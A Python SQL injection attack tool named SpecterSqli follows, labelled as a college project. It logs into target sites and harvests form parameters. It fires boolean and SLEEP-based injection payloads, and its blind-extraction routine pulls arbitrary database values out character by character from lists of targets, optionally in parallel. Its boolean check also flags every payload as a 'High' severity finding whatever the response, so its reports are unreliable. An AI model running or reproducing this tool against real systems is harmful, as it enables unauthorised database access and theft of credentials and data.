#!/usr/bin/env python3
# SpecterSqli
# Author: rhshourav
# Educational & College Project Use Only

import requests
import argparse
import time
import json
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor

USER_AGENT = "SpecterSqli/Final"

# =========================
# AUTHENTICATION
# =========================
def authenticated_login(session, opts):
    if not opts.login_url:
        return
    data = {
        opts.login_user_field: opts.login_user,
        opts.login_pass_field: opts.login_pass
    }
    r = session.post(opts.login_url, data=data, timeout=opts.timeout)
    if r.status_code in (200, 302):
        print("[+] Login successful")

# =========================
# PARAM DISCOVERY
# =========================
def discover_params(session, url, timeout):
    params = set()
    try:
        r = session.get(url, timeout=timeout)
        soup = BeautifulSoup(r.text, "html.parser")
        for tag in soup.find_all(["input", "textarea", "select"]):
            if tag.get("name"):
                params.add(tag.get("name"))
    except:
        pass
    return list(params) or ["id"]

# =========================
# BOOLEAN SQLi
# =========================
BOOLEAN_PAYLOADS = [
    "' OR 1=1 -- -",
    "' OR 'a'='a' -- -"
]

def boolean_test(session, url, param, timeout):
    findings = []

    baseline = session.post(url, data={param: "test"}, timeout=timeout)
    base_len = len(baseline.text)

    for payload in BOOLEAN_PAYLOADS:
        r = session.post(url, data={param: payload}, timeout=timeout)
        delta = abs(len(r.text) - base_len)

        findings.append({
            "type": "Boolean-Based SQL Injection",
            "param": param,
            "payload": payload,
            "evidence": {
                "baseline_length": base_len,
                "response_length": len(r.text),
                "length_delta": delta,
                "response_time": r.elapsed.total_seconds()
            },
            "description": (
                "Unsanitized user input is directly embedded into SQL queries, "
                "allowing logical manipulation of query conditions."
            ),
            "exploitation": (
                "In a lab environment, attackers can modify TRUE/FALSE logic "
                "to bypass authentication or alter application behavior."
            ),
            "impact": (
                "Authentication bypass, unauthorized access, and possible "
                "data exposure."
            ),
            "severity": "High",
            "remediation": (
                "Use prepared statements, parameterized queries, and strict "
                "server-side validation."
            )
        })
    return findings

# =========================
# TIME-BASED SQLi
# =========================
def time_test(session, url, param, sleep, timeout):
    payload = f"' OR IF(1=1,SLEEP({sleep}),0)-- -"
    start = time.time()
    session.post(url, data={param: payload}, timeout=sleep + timeout)
    elapsed = time.time() - start

    vulnerable = elapsed > sleep * 0.8

    return {
        "type": "Time-Based Blind SQL Injection",
        "param": param,
        "payload": payload,
        "evidence": {
            "response_time": round(elapsed, 2),
            "expected_delay": sleep
        },
        "description": (
            "Injected SQL conditions trigger database delays, indicating "
            "execution of user-controlled input."
        ),
        "exploitation": (
            "Attackers can infer sensitive values by observing response "
            "time differences, even without visible errors."
        ),
        "impact": (
            "Silent extraction of database names, credentials, or other "
            "sensitive information."
        ),
        "severity": "Critical" if vulnerable else "Low",
        "remediation": (
            "Disable dynamic SQL, use parameterized queries, and apply "
            "input validation."
        )
    }

# =========================
# BLIND EXTRACTION
# =========================
def blind_extract_fast(session, url, param, expr, maxlen, sleep, timeout):
    extracted = ""
    for pos in range(1, maxlen + 1):
        low, high = 32, 126
        while low <= high:
            mid = (low + high) // 2
            payload = (
                f"' OR IF(ASCII(SUBSTRING(({expr}),{pos},1))>{mid},"
                f"SLEEP({sleep}),0)-- -"
            )
            t0 = time.time()
            session.post(url, data={param: payload}, timeout=sleep + timeout)
            if time.time() - t0 > sleep * 0.8:
                low = mid + 1
            else:
                high = mid - 1
        if not 32 <= low <= 126:
            break
        extracted += chr(low)
        print(f"[+] Extracted: {extracted}")
    return extracted

# =========================
# REPORT GENERATORS
# =========================
def report_html(results):
    html = """
<html><head><meta charset="utf-8">
<title>SpecterSqli Report</title>
<style>
body{background:#0f172a;color:#e5e7eb;font-family:Arial;padding:20px}
table{width:100%;border-collapse:collapse;margin-bottom:30px}
td,th{border:1px solid #1e293b;padding:8px;vertical-align:top}
th{background:#1e293b}
pre{white-space:pre-wrap}
</style></head><body>
<h1>👻 SpecterSqli – SQL Injection Analysis Report</h1>
"""
    for r in results:
        html += f"<h2>Target: {r['url']}</h2>"
        if r.get("blind"):
            html += f"<p><b>Blind Extracted Data:</b><pre>{r['blind']}</pre></p>"
        for f in r["findings"]:
            html += f"""
<table>
<tr><th colspan="2">{f['type']}</th></tr>
<tr><td>Parameter</td><td>{f['param']}</td></tr>
<tr><td>Payload</td><td><pre>{f['payload']}</pre></td></tr>
<tr><td>Description</td><td>{f['description']}</td></tr>
<tr><td>Exploitation</td><td>{f['exploitation']}</td></tr>
<tr><td>Impact</td><td>{f['impact']}</td></tr>
<tr><td>Severity</td><td>{f['severity']}</td></tr>
<tr><td>Evidence</td><td><pre>{json.dumps(f['evidence'], indent=2)}</pre></td></tr>
<tr><td>Remediation</td><td>{f['remediation']}</td></tr>
</table>
"""
    return html + "</body></html>"

def report_markdown(results):
    md = "# SpecterSqli – SQL Injection Report\n\n"
    for r in results:
        md += f"## Target: {r['url']}\n\n"
        if r.get("blind"):
            md += f"**Blind Extracted Data:** `{r['blind']}`\n\n"
        for f in r["findings"]:
            md += f"""
### {f['type']}
- **Parameter:** {f['param']}
- **Payload:** `{f['payload']}`
- **Severity:** {f['severity']}

**Description:** {f['description']}

**Exploitation (Lab):** {f['exploitation']}

**Impact:** {f['impact']}

**Evidence:** `{f['evidence']}`

**Remediation:** {f['remediation']}

---
"""
    return md

def report_text(results):
    out = "SpecterSqli – SQL Injection Report\n\n"
    for r in results:
        out += f"Target: {r['url']}\n"
        if r.get("blind"):
            out += f"Blind Extracted Data: {r['blind']}\n"
        for f in r["findings"]:
            out += (
                f"\n[{f['type']}]\n"
                f"Param: {f['param']}\n"
                f"Payload: {f['payload']}\n"
                f"Severity: {f['severity']}\n"
                f"Impact: {f['impact']}\n"
                f"Remediation: {f['remediation']}\n"
            )
        out += "\n" + "="*60 + "\n"
    return out

# =========================
# ANALYSIS
# =========================
def analyze(url, opts):
    session = requests.Session()
    session.headers["User-Agent"] = USER_AGENT

    authenticated_login(session, opts)
    params = discover_params(session, url, opts.timeout)
    findings = []

    for p in params:
        findings.extend(boolean_test(session, url, p, opts.timeout))
        findings.append(time_test(session, url, p, opts.sleep, opts.timeout))

    blind = None
    if opts.blind:
        blind = blind_extract_fast(
            session, url,
            opts.blind_param or params[0],
            opts.blind,
            opts.maxlen,
            opts.sleep,
            opts.timeout
        )

    return {"url": url, "findings": findings, "blind": blind}

# =========================
# CLI
# =========================
def main():
    ap = argparse.ArgumentParser(description="SpecterSqli - College Project")
    ap.add_argument("--target")
    ap.add_argument("--targets-file")
    ap.add_argument("--sleep", type=int, default=2)
    ap.add_argument("--maxlen", type=int, default=20)
    ap.add_argument("--blind")
    ap.add_argument("--blind-param")
    ap.add_argument("--login-url")
    ap.add_argument("--login-user")
    ap.add_argument("--login-pass")
    ap.add_argument("--login-user-field", default="username")
    ap.add_argument("--login-pass-field", default="password")
    ap.add_argument("--timeout", type=int, default=6)
    ap.add_argument("--output-format", choices=["html", "json", "md", "txt"], default="html")
    ap.add_argument("--report", default="specter_report")
    ap.add_argument("--concurrency", action="store_true")
    ap.add_argument("--workers", type=int, default=6)

    opts = ap.parse_args()
    targets = []

    if opts.targets_file:
        with open(opts.targets_file) as f:
            targets = f.read().splitlines()
    if opts.target:
        targets.append(opts.target)

    if opts.concurrency:
        with ThreadPoolExecutor(max_workers=opts.workers) as ex:
            results = list(ex.map(lambda u: analyze(u, opts), targets))
    else:
        results = [analyze(t, opts) for t in targets]

    if opts.output_format == "html":
        content = report_html(results)
        filename = opts.report + ".html"
    elif opts.output_format == "json":
        content = json.dumps(results, indent=2)
        filename = opts.report + ".json"
    elif opts.output_format == "md":
        content = report_markdown(results)
        filename = opts.report + ".md"
    else:
        content = report_text(results)
        filename = opts.report + ".txt"

    with open(filename, "w", encoding="utf-8") as f:
        f.write(content)

    print("[+] Report generated:", filename)

if __name__ == "__main__":
    main()
